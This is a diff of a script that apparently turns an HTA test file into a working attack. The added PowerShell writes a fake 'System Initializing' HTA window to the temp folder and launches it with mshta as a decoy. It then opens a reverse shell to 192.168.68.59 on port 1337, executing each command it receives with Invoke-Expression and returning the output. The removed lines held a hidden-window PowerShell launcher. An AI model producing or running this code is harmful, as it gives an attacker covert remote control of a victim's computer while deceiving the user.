@@ -1,13 +1,39 @@
+# Show HTA window
+$hta = @'
 <html>
 <head>
-  <HTA:APPLICATION border="none" showInTaskbar="no" caption="no" />
+    <HTA:APPLICATION border="thin" caption="yes" />
 </head>
 <body>
-  <h1 style="font-family:sans-serif">Loading...</h1>
-  <script language="VBScript">
-    Dim x
-    x = "powershell -w hidden -nop -c ""Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('✅ Script Ran!')"""
-    CreateObject("WScript.Shell").Run x, 0, False
-  </script>
+    <h1>System Initializing</h1>
+    <p>Please wait...</p>
 </body>
 </html>
+'@
+$path = "$env:TEMP\init.hta"
+$hta | Out-File $path
+Start-Process mshta "`"$path`""
+
+# Run your TCP client silently
+$LHOST = "192.168.68.59"
+$LPORT = 1337
+[System.Net.Sockets.TCPClient]$client = $null
+try {
+    $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
+    $stream = $client.GetStream()
+    [byte[]]$bytes = 1024
+    while ($client.Connected) {
+        if ($stream.DataAvailable) {
+            $read = $stream.Read($bytes, 0, $bytes.Length)
+            $code = [System.Text.Encoding]::UTF8.GetString($bytes, 0, $read - 1)
+            if ($code.Length -gt 1) {
+                $output = try { Invoke-Expression $code 2>&1 } catch { $_ }
+                $writer = New-Object System.IO.StreamWriter($stream)
+                $writer.AutoFlush = $true
+                $writer.Write("$output`n")
+            }
+        }
+    }
+} finally {
+    if ($client) { $client.Close() }
+}
